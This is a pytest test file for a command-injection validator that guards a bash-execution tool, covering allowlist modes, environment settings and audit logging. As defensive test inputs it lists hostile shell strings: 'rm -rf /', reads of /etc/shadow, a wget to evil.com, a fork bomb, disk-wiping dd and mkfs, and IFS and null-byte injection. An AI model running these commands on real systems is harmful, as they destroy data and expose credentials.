"""
Unit tests for bash_tools.py command injection security hardening.

Tests the SecurityConfig and command validation system:
- Command allowlist validation
- Dangerous pattern blocking
- Environment variable configuration
- Logging of blocked commands
- Edge cases (empty, long, unicode commands)

TDD Layer: Unit Tests (Layer 1)
- Pure function testing with no external dependencies
- Full isolation using mocks where needed
"""

import pytest
import os
import sys
from pathlib import Path
from unittest.mock import patch, MagicMock, AsyncMock
import logging

# Add project root to path for imports
PROJECT_ROOT = Path(__file__).parent.parent.parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

# Import the security config module
from core.config.security_config import (
    SecurityConfig,
    validate_command,
    ALLOWED_COMMANDS,
    BLOCKED_PATTERNS,
    MAX_COMMAND_LENGTH,
)

# Try to import bash_tools at module level for integration tests
# This will be None if the import fails
try:
    from tools.system_tools.bash_tools import register_bash_tools

    BASH_TOOLS_AVAILABLE = True
except ImportError:
    register_bash_tools = None
    BASH_TOOLS_AVAILABLE = False


class TestSecurityConfigConstants:
    """Test SecurityConfig constant definitions."""

    def test_allowed_commands_is_set(self):
        """ALLOWED_COMMANDS should be a non-empty set of safe commands."""
        assert isinstance(ALLOWED_COMMANDS, (set, frozenset))
        assert len(ALLOWED_COMMANDS) > 0

    def test_allowed_commands_contains_expected_basics(self):
        """ALLOWED_COMMANDS should contain expected safe commands."""
        expected = {"ls", "cat", "git", "python", "npm", "pytest", "pip"}
        for cmd in expected:
            assert cmd in ALLOWED_COMMANDS, f"Expected '{cmd}' in ALLOWED_COMMANDS"

    def test_blocked_patterns_is_list(self):
        """BLOCKED_PATTERNS should be a list of tuples (pattern, label)."""
        assert isinstance(BLOCKED_PATTERNS, list)
        assert len(BLOCKED_PATTERNS) > 0
        for item in BLOCKED_PATTERNS:
            assert isinstance(item, tuple)
            assert len(item) == 2

    def test_max_command_length_is_positive(self):
        """MAX_COMMAND_LENGTH should be a positive integer."""
        assert isinstance(MAX_COMMAND_LENGTH, int)
        assert MAX_COMMAND_LENGTH > 0


class TestValidateCommandAllowlist:
    """Test command allowlist validation in strict mode."""

    def test_allowed_command_passes_strict_mode(self):
        """Commands in allowlist should pass in strict mode."""
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "strict"}):
            # Reload config to pick up env change
            is_allowed, reason = validate_command("ls -la")
            assert is_allowed is True
            assert reason == ""

    def test_allowed_git_command_passes(self):
        """Git commands should pass validation."""
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "strict"}):
            is_allowed, reason = validate_command("git status")
            assert is_allowed is True

            is_allowed, reason = validate_command("git diff --cached")
            assert is_allowed is True

    def test_allowed_python_command_passes(self):
        """Python commands should pass validation."""
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "strict"}):
            is_allowed, reason = validate_command("python --version")
            assert is_allowed is True

            is_allowed, reason = validate_command("python3 script.py")
            assert is_allowed is True

    def test_allowed_pytest_command_passes(self):
        """Pytest commands should pass validation."""
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "strict"}):
            is_allowed, reason = validate_command("pytest tests/")
            assert is_allowed is True

            is_allowed, reason = validate_command("pytest -v tests/unit/")
            assert is_allowed is True

    def test_allowed_npm_command_passes(self):
        """NPM commands should pass validation."""
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "strict"}):
            is_allowed, reason = validate_command("npm --version")
            assert is_allowed is True

            is_allowed, reason = validate_command("npm install")
            assert is_allowed is True

    def test_allowed_pip_command_passes(self):
        """Pip commands should pass validation."""
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "strict"}):
            is_allowed, reason = validate_command("pip list")
            assert is_allowed is True

            is_allowed, reason = validate_command("pip install requests")
            assert is_allowed is True

    def test_unknown_command_blocked_in_strict_mode(self):
        """Unknown commands should be blocked in strict mode."""
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "strict"}):
            # Use a command that is definitely not in the default allowlist
            is_allowed, reason = validate_command("unknowncustomcommand --flag")
            assert is_allowed is False
            assert "not in allowlist" in reason.lower()

    def test_unknown_command_allowed_in_permissive_mode(self):
        """Unknown non-dangerous commands should pass in permissive mode."""
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "permissive"}):
            # In permissive mode, even unknown commands pass if they don't match dangerous patterns
            is_allowed, reason = validate_command("unknowncustomcommand --flag")
            assert is_allowed is True


class TestValidateCommandDangerousPatterns:
    """Test dangerous pattern blocking."""

    @pytest.mark.parametrize(
        "command,description",
        [
            ("ls; rm -rf /", "command chaining with semicolon"),
            ("ls && cat /etc/passwd", "logical AND injection"),
            ("ls || cat /etc/shadow", "logical OR injection"),
            ("$(whoami)", "command substitution with $()"),
            ("`id`", "backtick command execution"),
            ("ls | cat /etc/passwd", "pipe injection"),
            ("ls > /etc/crontab", "output redirect to sensitive file"),
            ("ls < /dev/null; wget http://evil.com", "input redirect with injection"),
            ("ls\nrm -rf /", "newline injection"),
            ("${IFS}cat${IFS}/etc/passwd", "IFS variable abuse"),
        ],
    )
    def test_injection_attempt_blocked(self, command, description):
        """Injection attempts MUST be blocked in all modes."""
        # Test in strict mode
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "strict"}):
            is_allowed, reason = validate_command(command)
            assert is_allowed is False, f"Should block {description}"
            assert reason != ""

        # Test in permissive mode - still blocked
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "permissive"}):
            is_allowed, reason = validate_command(command)
            assert is_allowed is False, f"Should block {description} even in permissive mode"

    def test_rm_rf_root_blocked(self):
        """rm -rf / and variations should be blocked."""
        dangerous_commands = [
            "rm -rf /",
            "rm -rf /*",
            "rm -r -f /",
            "rm --recursive --force /",
            "sudo rm -rf /",
        ]
        for cmd in dangerous_commands:
            is_allowed, reason = validate_command(cmd)
            assert is_allowed is False, f"Should block: {cmd}"
            assert "dangerous" in reason.lower() or "blocked" in reason.lower()

    def test_fork_bomb_blocked(self):
        """Fork bomb patterns should be blocked."""
        fork_bombs = [
            ":(){ :|:& };:",
            ":(){:|:&};:",
        ]
        for cmd in fork_bombs:
            is_allowed, reason = validate_command(cmd)
            assert is_allowed is False, f"Should block fork bomb: {cmd}"

    def test_dd_to_device_blocked(self):
        """dd commands to devices should be blocked."""
        is_allowed, reason = validate_command("dd if=/dev/zero of=/dev/sda")
        assert is_allowed is False

    def test_mkfs_blocked(self):
        """mkfs commands should be blocked."""
        is_allowed, reason = validate_command("mkfs.ext4 /dev/sda1")
        assert is_allowed is False

    def test_chmod_777_root_blocked(self):
        """chmod 777 / should be blocked."""
        is_allowed, reason = validate_command("chmod 777 /")
        assert is_allowed is False
        is_allowed, reason = validate_command("chmod -R 777 /")
        assert is_allowed is False


class TestValidateCommandSafeCommands:
    """Test that safe commands are allowed."""

    @pytest.mark.parametrize(
        "command",
        [
            "ls -la",
            "git status",
            "python --version",
            "npm --version",
            "pytest tests/",
            "pip list",
            "cat README.md",
            "head -n 10 file.txt",
            "tail -f logs.txt",
            "grep pattern file.txt",
            "find . -name '*.py'",
            "wc -l file.txt",
            "echo hello world",
            "pwd",
            "whoami",
            "date",
            "env",
        ],
    )
    def test_safe_command_allowed_in_permissive(self, command):
        """Safe commands should be allowed in permissive mode."""
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "permissive"}):
            is_allowed, reason = validate_command(command)
            assert is_allowed is True, f"Should allow safe command: {command}"


class TestEnvironmentVariableConfiguration:
    """Test environment variable configuration."""

    def test_custom_allowlist_from_env(self):
        """BASH_COMMAND_ALLOWLIST should add commands to allowlist."""
        with patch.dict(
            os.environ,
            {
                "BASH_COMMAND_ALLOWLIST": "mycmd,anothercmd,specialtool",
                "BASH_COMMAND_ALLOWLIST_MODE": "strict",
            },
        ):
            # Need to reload config
            config = SecurityConfig.from_env()
            assert "mycmd" in config.allowed_commands
            assert "anothercmd" in config.allowed_commands
            assert "specialtool" in config.allowed_commands

    def test_strict_mode_from_env(self):
        """BASH_COMMAND_ALLOWLIST_MODE=strict should enable strict mode."""
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "strict"}):
            config = SecurityConfig.from_env()
            assert config.mode == "strict"

    def test_permissive_mode_from_env(self):
        """BASH_COMMAND_ALLOWLIST_MODE=permissive should enable permissive mode."""
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "permissive"}):
            config = SecurityConfig.from_env()
            assert config.mode == "permissive"

    def test_default_mode_is_permissive(self):
        """Default mode should be permissive for backward compatibility."""
        with patch.dict(os.environ, {}, clear=True):
            # Clear any existing env vars
            os.environ.pop("BASH_COMMAND_ALLOWLIST_MODE", None)
            config = SecurityConfig.from_env()
            assert config.mode == "permissive"

    def test_audit_blocked_commands_enabled(self):
        """BASH_AUDIT_BLOCKED_COMMANDS=true should enable auditing."""
        with patch.dict(os.environ, {"BASH_AUDIT_BLOCKED_COMMANDS": "true"}):
            config = SecurityConfig.from_env()
            assert config.audit_blocked_commands is True

    def test_audit_blocked_commands_disabled(self):
        """BASH_AUDIT_BLOCKED_COMMANDS=false should disable auditing."""
        with patch.dict(os.environ, {"BASH_AUDIT_BLOCKED_COMMANDS": "false"}):
            config = SecurityConfig.from_env()
            assert config.audit_blocked_commands is False


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_command_blocked(self):
        """Empty command should be blocked."""
        is_allowed, reason = validate_command("")
        assert is_allowed is False
        assert "empty" in reason.lower()

    def test_whitespace_only_command_blocked(self):
        """Whitespace-only command should be blocked."""
        is_allowed, reason = validate_command("   ")
        assert is_allowed is False
        assert "empty" in reason.lower()

    def test_very_long_command_blocked(self):
        """Commands exceeding MAX_COMMAND_LENGTH should be blocked."""
        long_command = "ls " + "a" * (MAX_COMMAND_LENGTH + 100)
        is_allowed, reason = validate_command(long_command)
        assert is_allowed is False
        assert "length" in reason.lower() or "too long" in reason.lower()

    def test_unicode_in_command(self):
        """Unicode characters should be handled safely."""
        # Unicode in arguments should be allowed
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "permissive"}):
            is_allowed, reason = validate_command("echo 'Hello World'")
            assert is_allowed is True

    def test_null_byte_injection_blocked(self):
        """Null byte injection should be blocked."""
        is_allowed, reason = validate_command("ls\x00rm -rf /")
        assert is_allowed is False

    def test_path_traversal_in_command(self):
        """Path traversal attempts should be handled."""
        # Path traversal in file operations - may or may not be blocked
        # depending on the overall command structure
        pass  # Implementation specific

    def test_command_with_quotes(self):
        """Commands with various quote styles should be handled."""
        with patch.dict(os.environ, {"BASH_COMMAND_ALLOWLIST_MODE": "permissive"}):
            is_allowed, reason = validate_command("echo 'hello world'")
            assert is_allowed is True

            is_allowed, reason = validate_command('echo "hello world"')
            assert is_allowed is True


class TestLoggingOfBlockedCommands:
    """Test that blocked commands are logged appropriately."""

    def test_blocked_command_logged_when_audit_enabled(self, caplog):
        """Blocked commands should be logged when auditing is enabled."""
        with patch.dict(
            os.environ,
            {"BASH_AUDIT_BLOCKED_COMMANDS": "true", "BASH_COMMAND_ALLOWLIST_MODE": "strict"},
        ):
            with caplog.at_level(logging.WARNING):
                is_allowed, reason = validate_command("dangerous; rm -rf /")
                assert is_allowed is False
                # Check that a warning was logged
                assert any(
                    "blocked" in record.message.lower() or "dangerous" in record.message.lower()
                    for record in caplog.records
                )

    def test_blocked_command_not_logged_when_audit_disabled(self, caplog):
        """Blocked commands should not be logged when auditing is disabled."""
        with patch.dict(
            os.environ,
            {"BASH_AUDIT_BLOCKED_COMMANDS": "false", "BASH_COMMAND_ALLOWLIST_MODE": "strict"},
        ):
            with caplog.at_level(logging.WARNING):
                initial_count = len(caplog.records)
                is_allowed, reason = validate_command("unknowncmd")
                # No new warning records for audit
                audit_records = [
                    r
                    for r in caplog.records[initial_count:]
                    if "blocked" in r.message.lower() and "audit" in r.message.lower()
                ]
                assert len(audit_records) == 0


class TestSecurityConfigClass:
    """Test SecurityConfig dataclass and methods."""

    def test_security_config_defaults(self):
        """SecurityConfig should have sensible defaults."""
        config = SecurityConfig()
        assert config.mode == "permissive"
        assert config.audit_blocked_commands is True
        assert isinstance(config.allowed_commands, (set, frozenset))

    def test_security_config_from_env(self):
        """SecurityConfig.from_env should load from environment."""
        with patch.dict(
            os.environ,
            {
                "BASH_COMMAND_ALLOWLIST": "custom1,custom2",
                "BASH_COMMAND_ALLOWLIST_MODE": "strict",
                "BASH_AUDIT_BLOCKED_COMMANDS": "false",
            },
        ):
            config = SecurityConfig.from_env()
            assert config.mode == "strict"
            assert config.audit_blocked_commands is False
            assert "custom1" in config.allowed_commands
            assert "custom2" in config.allowed_commands

    def test_security_config_validate_method(self):
        """SecurityConfig.validate() should work correctly."""
        config = SecurityConfig(mode="strict")
        is_allowed, reason = config.validate("ls -la")
        assert is_allowed is True

        is_allowed, reason = config.validate("rm -rf /")
        assert is_allowed is False


@pytest.mark.skipif(not BASH_TOOLS_AVAILABLE, reason="tools.system_tools not available")
class TestBashToolsIntegration:
    """Test integration with bash_tools.py."""

    @pytest.mark.asyncio
    async def test_bash_execute_calls_validation(self):
        """bash_execute should call validate_command before execution."""
        mcp_mock = MagicMock()
        tools = {}

        def capture_tool():
            def decorator(func):
                tools[func.__name__] = func
                return func

            return decorator

        mcp_mock.tool = capture_tool

        register_bash_tools(mcp_mock)
        bash_execute = tools.get("bash_execute")
        assert bash_execute is not None

        # Test that dangerous command is blocked before execution
        with patch("tools.system_tools.bash_tools.validate_command") as mock_validate:
            mock_validate.return_value = (False, "Command blocked: dangerous pattern")

            result = await bash_execute(
                command="rm -rf /",
                timeout=30,
                working_directory=None,
                run_in_background=False,
                env=None,
            )

            # Should have called validate_command
            mock_validate.assert_called_once()
            # Should return error without executing
            assert result["status"] == "error"
            assert "blocked" in result["error"].lower() or "dangerous" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_bash_execute_allows_safe_command(self):
        """bash_execute should allow safe commands after validation."""
        mcp_mock = MagicMock()
        tools = {}

        def capture_tool():
            def decorator(func):
                tools[func.__name__] = func
                return func

            return decorator

        mcp_mock.tool = capture_tool

        register_bash_tools(mcp_mock)
        bash_execute = tools.get("bash_execute")

        # Test with a safe command
        with patch("tools.system_tools.bash_tools.validate_command") as mock_validate:
            mock_validate.return_value = (True, "")

            # Mock the subprocess to avoid actual execution
            with patch("asyncio.create_subprocess_exec") as mock_exec:
                mock_process = AsyncMock()
                mock_process.communicate = AsyncMock(return_value=(b"output", b""))
                mock_process.returncode = 0
                mock_exec.return_value = mock_process

                result = await bash_execute(
                    command="ls -la",
                    timeout=30,
                    working_directory="/tmp",
                    run_in_background=False,
                    env=None,
                )

                mock_validate.assert_called_once_with("ls -la")
                assert result["status"] == "success"


class TestCommandExtraction:
    """Test extraction of base command from full command string."""

    def test_extract_simple_command(self):
        """Should extract base command from simple command."""
        from core.config.security_config import _extract_base_command

        assert _extract_base_command("ls -la") == "ls"
        assert _extract_base_command("git status") == "git"
        assert _extract_base_command("python script.py") == "python"

    def test_extract_command_with_path(self):
        """Should extract base command from path."""
        from core.config.security_config import _extract_base_command

        assert _extract_base_command("/usr/bin/ls -la") == "ls"
        assert _extract_base_command("/bin/sh -c echo") == "sh"

    def test_extract_command_with_env_prefix(self):
        """Should handle env prefix correctly."""
        from core.config.security_config import _extract_base_command

        # env VAR=value command
        assert _extract_base_command("env VAR=value ls -la") == "env"
